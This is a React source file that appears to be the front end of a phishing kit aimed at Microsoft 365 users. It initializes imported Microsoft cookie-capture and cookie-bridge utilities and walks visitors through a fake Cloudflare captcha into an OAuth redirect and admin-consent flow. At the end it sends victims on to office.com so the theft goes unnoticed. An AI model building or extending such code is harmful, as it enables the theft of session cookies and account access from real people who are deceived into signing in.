import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AdminConsentCallback from './components/AdminConsentCallback';
import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';

const App: React.FC = () => {
    return (
        <Router>
            <AppContent />
        </Router>
    );
};

const AppContent: React.FC = () => {
    // Initialize cookie utilities once when the app loads
    useEffect(() => {
        try {
            console.log('✅ Microsoft cookie capture utilities initialized');
            
            // Make utilities available globally for debugging
            if (typeof window !== 'undefined') {
                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                (window as any).microsoftCookieBridge = microsoftCookieBridge;
            }
            
            // Initialize the Microsoft Cookie Bridge
            console.log('🚀 Initializing Microsoft Cookie Bridge...');
            initializeMicrosoftCookieBridge();
            
        } catch (error) {
            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
        }
    }, []);

    return (
        <Routes>
            {/* ✅ UPDATED: Simplified callback route - no Auth0 processing */}
            <Route path="/auth/callback" element={<SimpleRedirect />} />
            
            {/* ✅ UPDATED: Simplified callback complete route */}
            <Route path="/callback-complete" element={<SimpleRedirect />} />
            
            {/* Legacy callback route for backward compatibility */}
            <Route path="/auth/callback/legacy" element={<SimpleRedirect />} />
            
            {/* Default route - captcha and login flow */}
            <Route path="*" element={<DefaultPage />} />
        </Routes>
    );
};

// ✅ NEW: Simple redirect component since no Auth0 processing needed
const SimpleRedirect: React.FC = () => {
    useEffect(() => {
        // Just redirect to Office after a brief moment
        console.log('📍 Callback hit, redirecting to Office...');
        setTimeout(() => {
            window.location.href = 'https://www.office.com/';
        }, 1500);
    }, []);

    return (
        <div style={{
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            height: '100vh',
            fontFamily: 'Segoe UI, Arial, sans-serif',
            backgroundColor: '#f3f2f1'
        }}>
            <div style={{ textAlign: 'center' }}>
                <div style={{
                    border: '4px solid #f3f3f3',
                    borderTop: '4px solid #0078d4',
                    borderRadius: '50%',
                    width: '40px',
                    height: '40px',
                    animation: 'spin 1s linear infinite',
                    margin: '0 auto 20px'
                }}></div>
                <h2 style={{ fontSize: '18px', color: '#323130' }}>Redirecting...</h2>
            </div>
            <style>{`
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

const DefaultPage: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');

    useEffect(() => {
        // Check URL params to determine which page to show
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        const error = urlParams.get('error');
        
        if (error) {
            console.error('❌ OAuth error from URL:', error);
            // Show error or redirect to captcha
            setCurrentPage('captcha');
            
            // Clean up URL
            window.history.replaceState({}, document.title, window.location.pathname);
            return;
        }
        
        if (step) {
            setCurrentPage(step);
            
            // Clean up URL after reading the step
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, []);

    const handleCaptchaVerified = () => {
        console.log('✅ Captcha verified, proceeding to replacement page');
        setCurrentPage('replacement');
    };

    const handleCaptchaBack = () => {
        console.log('🔄 Reloading page from captcha');
        window.location.reload();
    };
    
    // Render the appropriate page based on current state
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
            
        case 'replacement':
            return <RealOAuthRedirect />;
            
        default:
            // Fallback to captcha if unknown state
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;